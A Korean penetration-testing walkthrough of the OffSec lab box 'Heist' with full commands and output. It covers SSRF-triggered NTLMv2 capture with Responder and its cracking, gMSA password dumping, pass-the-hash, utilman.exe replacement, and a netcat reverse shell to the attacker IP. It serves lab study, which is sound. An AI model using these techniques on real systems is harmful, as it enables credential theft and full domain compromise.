> `utilman` 트릭은 **로그인 화면에 도달해야** 성립한다. NLA(Network Level Authentication)가 켜져 있으면 **화면이 그려지기 전에 자격증명을 요구**하므로 Win+U를 누를 화면 자체가 없다.
> 이 박스는 nmap이 이미 답을 줬다:
> ```
> RDP  192.168.120.165  3389  DC01  [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
> ```
> **`nla:False`.** 그래서 자격증명 없이 `xfreerdp3`로 붙어도 로그인 화면이 그려진다.
> **`nla:True`면 경로 A는 버리고 경로 B로 간다.** 이 한 글자를 확인하지 않고 utilman을 갈아엎으면 시스템 파일만 망가뜨리고 끝난다.

> [!warning] `svc_apache$`가 **왜** `SeRestorePrivilege`를 가졌는지는 BloodHound로 알 수 없다 `[가정]`
> 이 특권은 보통 `Backup Operators`·`Server Operators` 멤버십에서 온다. 그런데 이 도메인에서는 두 그룹 모두 **멤버가 0명**이다:
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ jq -r '.data[] | select(.Properties.name|test("^(BACKUP|SERVER) OPERATORS@")) | [.Properties.name, ((.Members//[])|length)] | @tsv' 20260708141821_groups.json
> SERVER OPERATORS@HEIST.OFFSEC	0
> BACKUP OPERATORS@HEIST.OFFSEC	0
> ```
> 그러므로 이 특권은 **그룹이 아니라 User Rights Assignment(로컬 보안 정책 / GPO)로 계정에 직접 부여**된 것으로 본다 `[가정]`. **BloodHound는 URA를 수집하지 않는다.**
> **교훈: 그래프에 경로가 없다고 특권이 없는 것이 아니다. 셸을 잡으면 반드시 `whoami /priv`를 쳐라.** 이 박스의 권한상승은 그래프가 아니라 그 한 줄에서 나왔다.

### 2-8. 이 박스는 왜 Kerberos를 한 번도 안 썼나 — 그리고 써야 할 때의 시계 함정

포트 88이 열려 있는데도 이 박스는 **처음부터 끝까지 NTLM으로만** 풀렸다. `evil-winrm -p`, `evil-winrm -H`(PtH), `nxc`, `bloodyAD` 전부 NTLM 인증이다. 이유는 단순하다 — **NTLM이 활성화돼 있고, 그것으로 필요한 모든 접근이 됐기 때문**이다.

NTLM으로 안 될 때(도메인이 NTLM을 껐거나, 특정 SPN에 대한 티켓이 필요하거나, 위임을 악용해야 할 때) 비로소 Kerberos로 간다. 그리고 그 순간 **두 개의 전제조건**이 생긴다.

**전제조건 1 — 이름 해석.** Kerberos는 IP로 티켓을 요청할 수 없다. SPN이 `서비스클래스/호스트FQDN` 형식이기 때문이다(`cifs/DC01.heist.offsec`, `HTTP/DC01.heist.offsec`). 그래서 `/etc/hosts`에 등록이 필요하다:

```
192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
```

**세 이름을 다 넣는 이유**: 도구마다 요구하는 형태가 다르다. `impacket-getST`는 FQDN을, `evil-winrm -r`은 realm을, 일부 도구는 짧은 호스트명을 쓴다. 하나만 넣고 다른 도구에서 막히면 원인을 못 찾는다.

**전제조건 2 — 시계.** Kerberos는 리플레이 방지를 위해 **인증자(authenticator)에 현재 시각을 넣고**, KDC/서비스가 자기 시계와 비교한다. 기본 허용 오차는 **5분**이고, 넘으면 이 오류가 난다:

- `KRB_AP_ERR_SKEW` (Clock skew too great)
- impacket 계열은 파이썬 예외로 `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`

**이 박스에서는 문제가 없었다.** nmap이 그것을 스캔 시점에 이미 확인해 줬다:

```
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-08T04:58:17+00:00; 0s from scanner time.
```

**`0s from scanner time`** — Kali 시계와 DC 시계의 차이가 0초다. `smb2-time`의 `date: 2026-07-08T04:57:39`, 88 포트 배너의 `server time: 2026-07-08 04:56:41Z`도 같은 값을 가리킨다. **독립 근거 세 개가 일치한다.**

> [!danger] `KRB_AP_ERR_SKEW`를 만나면 — 두 가지 대처
> **A. 시스템 시계를 타겟에 맞춘다** (전역, 되돌려야 함)
> ```bash
> sudo ntpdate <DC-IP>            # 또는 sudo rdate -n <DC-IP>
> sudo timedatectl set-ntp false  # 자동 동기가 다시 밀어버리는 것을 막는다
> ```
> [[Resourced]]에서 실제로 `sudo ntpdate 192.168.120.175`를 친 기록이 있다.
>
> **B. 그 명령에만 가짜 시각을 준다** (전역 시계를 안 건드린다)
> ```bash
> faketime "$(date -d "$(nxc smb <DC-IP> | grep -oP '(?<=time: ).*')" '+%Y-%m-%d %H:%M:%S')" impacket-getST ...
> ```
> **B가 낫다** — VPN·인증서 검증·다른 박스 작업이 시계에 물려 있어서, 전역 시계를 밀면 엉뚱한 곳이 깨진다. 위 `faketime` 한 줄은 **이 박스에서 실행하지 않았다** — 관측된 것이 아니라 대처 절차의 형태를 적어둔 것이다.
>
> **판정 순서: nmap의 `ssl-date`/`smb2-time` → 차이가 5분 이내면 시계는 용의자가 아니다.** 이 확인 없이 시계부터 만지면 진짜 원인(FQDN 미등록·SPN 오타·NTLM 폴백)을 놓친다.

> [!tip] NTLM과 Kerberos를 언제 갈아타는가 — 결정표
>
> | 상황 | 쓸 것 |
> |---|---|
> | 평문 비밀번호가 있고 SMB/WinRM만 필요 | **NTLM** (`-u/-p`). 이 박스가 여기 |
> | NT 해시만 있고 SMB/WinRM 필요 | **NTLM PtH** (`-H`). 이 박스 §4-3 |
> | NT 해시만 있는데 **Kerberos 전용** 서비스 | **Overpass-the-Hash** — `impacket-getTGT -hashes :<NT>` → `export KRB5CCNAME=...` → `-k` |
> | 도메인이 NTLM 차단 | Kerberos 필수. `/etc/hosts` + 시계 확인부터 |
> | 위임·티켓 위조(Golden/Silver) | Kerberos 필수 ([[Nagoya]]·[[Resourced]]) |

### 2-9. 왜 이 페이로드인가 — `?url=` 값을 조각내어 본다

이 박스에서 통한 값은 딱 이것이다:

```
?url=http://192.168.45.175
```

세 조각으로 쪼개면 각 조각이 하는 일이 분명해진다.

| 조각 | 역할 | 바꾸면 / 빼면 |
|---|---|---|
| `http://` | **스킴.** 서버측 HTTP 클라이언트를 태운다 | 빼면 URL 파서가 상대 경로로 해석하거나 예외를 던진다. 이 앱에서 스킴 없는 값을 넣었을 때의 동작은 **관측하지 않았다** |
| `192.168.45.175` | **Kali의 tun0 주소.** Responder가 이 IP로 바인딩돼 있다(§3-1의 `Responder IP`) | VPN 재연결로 IP가 바뀌면 요청이 아무 데도 안 온다. **매번 `ip -br a`로 확인** |
| (포트 없음) | 기본 **80**. Responder의 HTTP 서버가 80에서 듣는다 | `:8000` 같은 비표준 포트를 쓰면 Responder는 안 듣는다. 굳이 바꿀 이유가 없다 |

**여기에 경로가 없다는 점이 중요하다.** `?url=http://192.168.45.175/anything` 이어도 상관없다 — 인증은 **첫 요청의 401 응답**에서 발생하므로 경로는 무의미하다. 즉 **"응답 본문을 받아내는 것"이 목적이 아니라 "401을 한 번 받게 하는 것"이 목적**이다. 이 구분이 SSRF 사고와 강제 인증 사고를 가른다.

> [!tip] 같은 자리에서 시도해 볼 변형 — 우선순위 순
> 어떤 앱이 어떤 스킴을 처리하는지 모르므로 **위에서부터 하나씩** 넣는다. 아래 중 이 박스에서 **실제로 넣어본 것은 1번뿐**이다 — 나머지는 실행하지 않았고 출력을 관측하지 않았다.
>
> 1. `http://<KALI>` — 가장 잘 통한다. HTTP 클라이언트를 쓰는 모든 페처가 대상
> 2. `\\<KALI>\share\x` — **UNC.** Windows 파일 API를 태우면 SMB 인증이 나간다. 성공하면 `MsvAvTargetName`이 `cifs/...`로 바뀐다([[Vault]]가 이 형태)
> 3. `file://<KALI>/share/x` — UNC의 URL 표기. .NET·일부 라이브러리가 이쪽만 받는다
> 4. `http://127.0.0.1:<포트>/` — 방향을 바꿔 **내부 포트 스캔**. 응답 시간·오류 문구 차이로 개폐를 읽는다([[Squid]]의 프록시 스캔과 같은 사고)
> 5. `http://<KALI>:80/@<타겟>` · `http://<KALI>#@<타겟>` — 허용목록 우회 변형. 필터가 있을 때만
>
> **1번이 통하면 나머지를 시도할 이유가 없다.** 자격증명은 한 번만 잡으면 된다.

> [!warning] 리스너를 먼저 띄우고 페이로드를 넣어라 — 순서가 반대면 증거가 사라진다
> 서버측 페치는 **한 번만** 일어난다. Responder가 안 떠 있으면 그 요청은 연결 거부로 끝나고, 앱이 결과를 캐시하면 **같은 URL을 다시 넣어도 요청이 안 나갈 수 있다.**
> 방어책: 값을 매번 다르게 만든다 — `?url=http://192.168.45.175/1`, `/2`, `/3`. 캐시 키가 달라지므로 재시도가 확실히 나간다.

---

## 3. Foothold

### 3-1. Responder 대기

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.175]
    Challenge set              [random]

[*] Version: Responder 3.1.7.0

[+] Listening for events...
```

![[Pasted image 20260708140946.png]]

**읽어야 할 세 줄**

| 줄 | 의미 |
|---|---|
| `HTTP server [ON]` | 이 박스의 트리거가 HTTP였으므로 **이 줄이 켜져 있어야 성립**한다. Kali 기본 `/usr/share/responder/Responder.conf`가 `HTTP = On`으로 출하된다 (아래 확인) |
| `Responder IP [192.168.45.175]` | **`?url=`에 넣을 주소가 이것이다.** VPN이 재연결되면 바뀌므로 매번 확인 |
| `Challenge set [random]` | 서버 챌린지가 매번 달라진다. **레인보우 테이블이 무의미**해지고 사전 크랙만 남는다 |

```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "^(SMB|HTTP|HTTPS|LDAP|Challenge)" /usr/share/responder/Responder.conf
SMB      = On
HTTP     = On
HTTPS    = On
LDAP     = On
Challenge = Random
```

> [!warning] `-I`는 **인터페이스 이름**이지 IP가 아니다
> 이 박스에서 `sudo responder -I 192.168.45.175`를 먼저 쳤다가 `-I tun0`으로 고쳐 다시 쳤다(`~/.zsh_history`에 두 줄이 연달아 남아 있다). VPN 인터페이스는 **거의 항상 `tun0`** 이다. `ip -br a`로 확인하는 습관을 들여라.

### 3-2. 페이로드 투입 — `?url=`에 Kali를 가리킨다

```
http://192.168.120.165:8080/?url=http://192.168.45.175
```

![[Pasted image 20260708140909.png]]

> [!tip] 여기서 `http://`를 빼면 안 된다
> `?url=192.168.45.175` 처럼 스킴 없이 넣으면 서버측 URL 파서가 상대 경로로 해석하거나 예외를 던질 수 있다. **스킴을 명시**하라. 이 박스에서 통한 형태는 위 그대로다.
>
> 같은 자리에서 SMB를 노리고 싶으면 `?url=\\192.168.45.175\share` 형태의 **UNC**를 시도한다 — 성공하면 §2-2의 `MsvAvTargetName`이 `cifs/...`로 바뀐다. (이 박스에서는 시도하지 않았다.)

### 3-3. 해시 캡처 → 크랙

```bash
[HTTP] NTLMv2 Client   : 192.168.120.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:a9a24c7373e7eaf6:812295EA02430380A3C69B6C8CD67A27:01010000000000007062E9B8970EDD010F8C5BB3E46D76E3000000000200080054004A004A00370001001E00570049004E002D00370031004A00470058004100340051005500300050000400140054004A004A0037002E004C004F00430041004C0003003400570049004E002D00370031004A00470058004100340051005500300050002E0054004A004A0037002E004C004F00430041004C000500140054004A004A0037002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```

![[Pasted image 20260708140953.png]]

`NTLMv2 Client : 192.168.120.165` — **소스가 타겟 IP다.** 이것으로 "서버측 페치"가 확정된다(§1-2의 판별법).

![[Pasted image 20260708141125.png]]

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ cat hash.txt
enox::HEIST:a9a24c7373e7eaf6:812295EA02430380A3C69B6C8CD67A27:0101000000000000...

┌──(kali㉿kali)-[~/PG/Heist]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 11147/22294 MB (4096 MB allocatable), 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENOX::HEIST:a9a24c7373e7eaf6:812295ea02430380a3c69b6c8cd67a27:0101000000000000...:california

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Wed Jul  8 14:10:29 2026 (0 secs)
Time.Estimated...: Wed Jul  8 14:10:29 2026 (0 secs)
Speed.#01........:  1244.3 kH/s (1.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Candidates.#01...: 123456 -> oooooo
```

**`Progress: 4096/14344385` — 1,434만 후보 중 4,096번째에서 끝났다. 2초.** rockyou 앞쪽에 있는 비밀번호였다.

> [!tip] 2초 안에 안 깨지면 **rockyou로는 안 깨진다**
> NetNTLMv2는 반복(iteration)이 없는 HMAC-MD5 2회라 CPU만으로도 초당 100만 건이 나온다(위 출력의 `1244.3 kH/s`). **rockyou 전체가 CPU에서 12초다.**
> 12초 안에 안 나오면 규칙(`-r /usr/share/hashcat/rules/best64.rule`)을 붙이거나, **크랙을 포기하고 다른 경로**로 간다. 여기서 30분을 쓰는 것이 시험에서 가장 흔한 시간 낭비다.

**획득: `heist.offsec\enox : california`**

### 3-4. 자격증명을 4개 프로토콜에 한 번에 던진다

`nxc-sweep`은 `/usr/local/bin/`에 둔 bash 래퍼로, 열린 포트를 확인하고 `nxc`를 프로토콜별로 순차 실행한다.

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc-sweep 192.168.120.165 -u 'enox' -p 'california'
[*] Starting NXC sweep for 192.168.120.165 as enox ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.165 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
SMB         192.168.120.165 445    DC01             [+] heist.offsec\enox:california
SMB         192.168.120.165 445    DC01             [*] Enumerated shares
SMB         192.168.120.165 445    DC01             Share           Permissions     Remark
SMB         192.168.120.165 445    DC01             -----           -----------     ------
SMB         192.168.120.165 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.120.165 445    DC01             C$                              Default share
SMB         192.168.120.165 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.120.165 445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.120.165 445    DC01             SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.165 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:heist.offsec)
WINRM       192.168.120.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.165 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
RDP         192.168.120.165 3389   DC01             [+] heist.offsec\enox:california

[-] Port 1433 closed/filtered. Skipping mssql
[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

![[Pasted image 20260708141241.png]]

**이 출력에서 뽑아야 할 네 가지**

1. `ADMIN$`·`C$`에 **권한 표시가 없다** → `enox`는 로컬 관리자가 아니다. §2-6의 `(Pwn3d!)` 함정과 정확히 일치한다
2. `signing:True` → §2-4의 릴레이 판정을 **두 번째 독립 근거**로 확인
3. `nla:False` → §2-7의 utilman 경로가 살아 있다
4. WinRM 인증 성공 → **대화형 셸이 가능**하다. ⚠️ 플래그는 반드시 여기서 읽는다 ([[Butch]])

### 3-5. WinRM 셸 · local.txt

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enox\Documents> type c:\users\enox\desktop\local.txt
a1909577c8fb09bed9a1ff474af80620
```

> [!tip] 시험 증거 형식 연습 — 플래그와 신원을 한 화면에
> 시험에서는 `whoami` · `hostname` · `ipconfig`(또는 `ip a`) 와 플래그 내용이 **한 스크린샷 안에** 있어야 인정된다. 습관을 들여라:
> ```powershell
> whoami; hostname; ipconfig | findstr IPv4; type C:\Users\enox\Desktop\local.txt
> ```
> ⚠️ **웹셸에서 읽은 플래그는 0점**이다. 규정 원문이 *"this includes any type of web-based shell"* 이다. 이 박스는 evil-winrm이 대화형 셸이므로 문제없다.

---

## 4. 권한상승

### 4-1. 열거 — 사용자 목록과 그래프

```powershell
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:25 AM                Administrator
d-----        7/20/2021   4:17 AM                enox
d-r---        5/28/2021   3:53 AM                Public
d-----        9/14/2021   8:27 AM                svc_apache$
```

![[Pasted image 20260708144718.png]]

**`svc_apache$` — 이름 끝의 `$`가 전부를 말한다.** 컴퓨터 계정 아니면 (g)MSA다. `C:\Users`에 프로필이 있으니 로그온한 적이 있는 서비스 계정이다.

BloodHound를 돌려 그래프로 확인한다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ bloodhound-python -u enox -p california -d Heist.offsec -ns 192.168.120.165 -c All
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-ns 192.168.120.165` | **DNS 서버를 DC로 지정** | Kali의 `/etc/resolv.conf`는 `heist.offsec`을 모른다. 빼면 LDAP 연결 단계에서 이름 해석이 실패한다 |
| `-c All` | 모든 수집기 | 기본값은 일부만 돈다. ACL 엣지(`ReadGMSAPassword` 포함)를 놓친다 |
| `-d Heist.offsec` | 도메인 | **FQDN이어야 한다.** `heist.local` 같은 오타는 §6-3에서 실제로 났다 |

> [!danger] `-ns`를 줘도 **Kerberos는 별도로 실패한다** — `/etc/hosts`가 필요한 이유
> [[Vault]]에서 같은 명령의 출력이 이것을 그대로 보여줬다(관측된 원문):
> ```
> INFO: Getting TGT for user
> WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
>          Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
> ```
> `-ns`는 **LDAP 조회에 쓰는 리졸버**를 바꾸지만, **Kerberos 단계는 시스템 리졸버로 `dc.<도메인>:88`을 찾는다.** 그래서 NTLM으로 폴백했다.
> NTLM이 막힌 환경(NTLM 비활성 도메인)이라면 여기서 수집 자체가 실패한다. **그때 필요한 것이 `/etc/hosts`다:**
> ```
> 192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
> ```
> **SPN은 `서비스클래스/호스트FQDN` 형태**라 Kerberos는 IP가 아니라 **이름**으로만 티켓을 요청할 수 있다. `-k` 인증·`impacket-getST`·`evil-winrm -r` 전부 이 등록이 없으면 죽는다.
> 같은 함정이 [[Resourced]]·[[Nagoya]]의 티켓 위조 구간에서도 나온다.

> [!warning] BloodHound 데이터는 **수집 시점의 스냅샷**이다
> 이 박스의 JSON 파일명은 `20260708141821_*.json` — **14:18:21에 찍은 사진**이다. 그 뒤에 바뀐 것은 그래프에 없다.
> 실전에서 이것이 물리는 두 가지:
> 1. **내가 만든 변경이 안 보인다** — 권한을 추가한 뒤 그래프를 다시 봐도 옛날 그림이다. 재수집해야 한다 ([[Vault]] §4에서 실제로 이 상황이 나왔다)
> 2. **URA·로컬 특권은 애초에 수집 대상이 아니다** — 이 박스의 결정타 `SeRestorePrivilege`가 그래프에 없다(§2-7)
>
> **그래프는 시작점이지 전부가 아니다.**

### 4-2. gMSA 비밀번호 읽기 — 두 가지 방법

**방법 1 — Kali에서 `bloodyAD`로 LDAP 직접 조회 (권장)**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ bloodyAD --host 192.168.120.165 -d heist.offsec -u enox -p california get object 'svc_apache$' --attr msDS-ManagedPassword

distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:76a431e264ca606c0ade543f59b7a470
msDS-ManagedPassword.B64ENCODED: bZWXotad8olrCM62+lM8Gm2/91Dy7WKBUKgAVwec1REk/1O4KTfQJSas94jwsyFH1FrT37sSZ9vlyXGN1oGRZNdS/oJSCWog+t8ViAiQKHHCqz3lodTwCCRIOd6yyeXpHqPB1/S+mIMXo+eyZL+uC/lIOk0uZWFPzKhwzNCNedjG90f6sz7RBsMiUO/LYK9dCbKKvhzzpGlFKSYk8H0rnIPMM8I2ycz8h1EJl/YwSjqMfi1IAz6JZIB28xJ1Vr4e6UPA1chwbeG+1by28v5VrL9dqlZWe9UYj3YVxdfv7E5sNGqfLCOW3ZQQaQVgbV/+Oul8t2KlfCMIpKhaMbjjKA==
```

**명령 해부**

| 조각 | 역할 |
|---|---|
| `get object 'svc_apache$'` | LDAP 객체 하나를 조회. **`$`는 반드시 작은따옴표 안에** — bash에서 `$s`가 변수 확장으로 먹힌다 |
| `--attr msDS-ManagedPassword` | 계산된 속성 하나만 요청. **DC가 요청 시점에 만들어 준다** |
| `-d heist.offsec` | **FQDN.** `heist.local`로 쓰면 실패한다(§6-3) |
| 출력 `.NTLM:` | bloodyAD가 blob에서 현재 비밀번호를 꺼내 **NT 해시로 미리 계산해 준다.** `aad3b4...`는 빈 LM 해시 |

**NT 해시 `76a431e264ca606c0ade543f59b7a470` — 이것이 곧 자격증명이다.** 평문은 120자 랜덤이라 크랙할 이유도 없고, PtH에는 NT 해시만 있으면 된다.

**방법 2 — 타겟에서 `GMSAPasswordReader.exe` (평문·Kerberos 키까지 필요할 때)**

```powershell
*Evil-WinRM* PS C:\Users\enox\Documents> iwr 192.168.45.175/GMSAPasswordReader.exe -o reader.exe
*Evil-WinRM* PS C:\Users\enox\Documents> .\reader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : AD580D1BA99F2167B14EC7DB4D3E0F9C
[*]       aes128_cts_hmac_sha1 : 948AC08EE52E117368FD6E2CEC771D83
[*]       aes256_cts_hmac_sha1 : 031595195375D0FE66DF2783398C289629BA1243604BA2EEC6EA3ABEDCF2C819
[*]       des_cbc_md5          : E9B368D308FBDC58

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 76A431E264CA606C0ADE543F59B7A470
[*]       aes128_cts_hmac_sha1 : B7DB7F6148D4DD3C7B101F7C1F846CDE
[*]       aes256_cts_hmac_sha1 : 7D529FCF364669301FA43E8040F5655F459D39847A305BA76BC8040C0B94217D
[*]       des_cbc_md5          : 83E6F249922FE04C
```

> [!note] `Old Value` / `Current Value` 두 벌이 나오는 이유
> gMSA blob에는 **이전 비밀번호와 현재 비밀번호가 함께** 들어 있다. 롤 직후 아직 갱신을 못 받은 클라이언트가 인증할 수 있게 하는 유예 장치다.
> **써야 하는 것은 `Current Value`** 다 — `76A431E2...`. 이 값이 방법 1의 `bloodyAD` 결과와 **글자 단위로 일치**한다. 서로 다른 도구·다른 경로에서 나온 **독립 근거 2개**로 교차 검증된 셈이다.
>
> `rc4_hmac`은 **NT 해시와 같은 값**이다(Kerberos etype 23이 NT 해시를 키로 쓴다). 그래서 이 한 값이 **PtH에도, `-k` Kerberos 인증에도** 쓰인다.

두 방법의 우열:

| | bloodyAD (Kali) | GMSAPasswordReader (타겟) |
|---|---|---|
| 파일 업로드 | 불필요 | **필요** — AV·EDR에 걸릴 수 있다 |
| 얻는 것 | NT 해시 + base64 blob | NT 해시 + **AES128/256 Kerberos 키** |
| 언제 쓰나 | 기본 | **AES만 허용된 도메인**(RC4 비활성)에서 Kerberos를 써야 할 때 |

**시험에서는 bloodyAD 쪽이 낫다** — 업로드가 없어 흔적과 위험이 적다.

### 4-3. Pass-the-Hash로 `svc_apache$` 셸

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'svc_apache$' -H '76A431E264CA606C0ADE543F59B7A470'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

> [!tip] `-H`가 PtH다 — 평문이 없어도 NTLM 인증은 성립한다
> NTLM 인증의 입력은 비밀번호가 아니라 **NT 해시**다. 그래서 해시만 있으면 평문 없이 인증이 된다. **이것이 Pass-the-Hash의 전부다.**
> `-H`에는 **NT 해시만** 넣는다. `LM:NT` 전체 형식(`aad3b4...:76a431...`)도 대부분의 도구가 받지만, evil-winrm에는 NT 부분만 주는 것이 안전하다.
> ⚠️ **Kerberos에는 PtH가 통하지 않는다.** Kerberos는 NT 해시를 RC4 키로 쓰는 **Overpass-the-Hash**(`impacket-getTGT -hashes :<NT>`)로 가야 한다.

**`SeRestorePrivilege` Enabled — 여기가 결승선이다.** 특권 목록은 4개뿐이고 `SeImpersonatePrivilege`는 **없다**. 즉 [[Squid]]에서 쓴 Potato 계열은 여기서 안 통한다.

### 4-4. 경로 A — `utilman.exe` 치환 + RDP

```powershell
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> cd c:\
*Evil-WinRM* PS C:\> cd windows
*Evil-WinRM* PS C:\windows> cd system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
```

![[Pasted image 20260708152930.png]]

**순서가 중요하다.** 원본을 먼저 치워야(`utilman.old`) 이름 충돌 없이 `cmd.exe`를 그 자리에 놓을 수 있다. 오류 없이 두 줄이 통과했다는 것 자체가 **`SeRestorePrivilege`가 DACL을 우회했다는 증거**다 — 일반 사용자는 `System32`에 이름변경을 못 한다.

```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /v:192.168.120.165 /cert:ignore /sec:tls
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| **자격증명 없음** | 로그인 **화면**까지만 간다 | 이 트릭은 로그인 전 화면이 목적이므로 `/u:`가 필요 없다 |
| `/cert:ignore` | 자가서명 인증서 경고 무시 | 대화형 승인 프롬프트에서 멈춘다 |
| `/sec:tls` | 보안 프로토콜을 TLS로 고정 | NLA 협상으로 빠지면 **자격증명을 먼저 요구**해 로그인 화면에 도달하지 못한다. `nla:False`인 타겟에서 이 플래그가 경로를 열어준다 |

로그인 화면에서 **Win+U**(접근성)를 누르면 `Utilman.exe`(=`cmd.exe`)가 **SYSTEM으로** 뜬다.

![[Pasted image 20260708153113.png]]

> [!danger] 끝나면 **되돌려라**
> ```powershell
> ren Utilman.exe cmd.exe
> ren utilman.old utilman.exe
> ```
> 되돌리지 않으면 다음 사람(또는 재부팅 후의 나)이 로그인 화면에서 접근성 기능을 잃는다. 시험은 **리버트 후 재현**을 요구하므로, 원복 절차까지가 한 세트다.

### 4-5. 경로 B — `SeRestoreAbuse.exe` + 리버스셸

파일이 아니라 **레지스트리**를 노린다. 업로드 두 개:

```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/SeRestoreAbuse.exe -o SeRestoreAbuse.exe
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/nc64.exe -o nc64.exe
```

![[Pasted image 20260708155147.png]]

```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> .\SeRestoreAbuse.exe "C:\users\svc_apache$\desktop\nc64.exe 192.168.45.175 4444 -e powershell.exe"
Start-Service seclogon
RegCreateKeyExA result: 0
RegSetValueExA result: 0
```

![[Pasted image 20260708155102.png]]

**출력을 읽는 법** — `RegCreateKeyExA result: 0` / `RegSetValueExA result: 0`. Win32에서 **0 = `ERROR_SUCCESS`** 다. 레지스트리 키 생성·값 설정이 둘 다 성공했다는 뜻이고, 이 쓰기가 통한 이유가 `SeRestorePrivilege`다.

